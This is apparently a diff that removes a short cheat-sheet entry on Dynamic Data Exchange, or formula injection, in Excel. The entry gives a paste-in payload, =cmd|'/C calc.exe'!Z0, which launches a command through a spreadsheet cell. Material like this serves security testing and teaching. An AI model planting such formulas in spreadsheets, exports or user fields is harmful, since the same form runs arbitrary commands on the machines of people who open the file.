@@ -1,5 +1,0 @@
-Dynamic Data Exchange:
-
-This technique is also known as formula injection, just paste the following test into excel cell.
-
-=cmd|'/C calc.exe'!Z0
